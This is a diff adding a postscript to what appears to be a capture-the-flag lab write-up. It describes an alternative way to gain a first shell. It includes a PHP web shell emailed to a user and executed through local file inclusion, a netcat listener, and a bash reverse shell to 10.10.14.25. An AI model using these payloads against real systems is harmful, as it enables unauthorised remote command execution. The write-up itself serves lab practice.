@@ -37,3 +37,21 @@ sudo nmap --interactive
 ```
 
 
+P.S.  
+Different ways could have been used to gain the first shell to the system. I also reproduced the exploit showed by ippsec. Namely:  
+1. Use telnet to enumerate (trial and error) the users which have an email service active.  
+2. Send an email to one of the user found (i.e. asterisk) containing a backdoor:  
+```
+<?php system($_REQUEST("exploit")); ?>  
+```
+3. We set up a local listener
+```
+nc -lnvp 4444
+```
+3. Use the file inclusion vulnerability we used before to execute the backdoor. The file to visit is now /var/mail/asterisk where the previously sent email is stored.
+4. The request variable "exploit" is set to the command we want to execute.
+```
+bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
+```
+
+
